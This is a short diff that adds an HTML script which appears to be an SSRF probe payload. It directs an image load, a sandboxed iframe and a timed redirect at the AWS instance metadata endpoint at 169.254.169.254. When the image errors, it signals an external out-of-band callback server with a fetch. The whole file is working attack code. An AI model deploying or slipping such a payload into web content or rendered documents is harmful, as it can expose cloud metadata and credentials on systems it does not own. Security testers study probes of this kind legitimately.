@@ -1,0 +1,23 @@
+<script>
+  (function () {
+    const oobServer = "https://bjgibppjensgmxvguqwdxi3709jiv7pjm.oast.fun";
+
+    // Technique 1: Image tag with error handling
+    const img = new Image();
+    img.src = 'http://169.254.169.254/latest/meta-data/hostname';
+    img.onerror = () => {
+      fetch(`${oobServer}/img-error`);
+    };
+
+    // Technique 2: Iframe with sandbox
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts allow-same-origin';
+    iframe.src = 'http://169.254.169.254/latest/meta-data/';
+    document.body.appendChild(iframe);
+
+    // Technique 3: Redirect via meta tag (if allowed)
+    setTimeout(() => {
+      window.location = 'http://169.254.169.254/latest/meta-data/';
+    }, 1000);
+  })();
+</script>
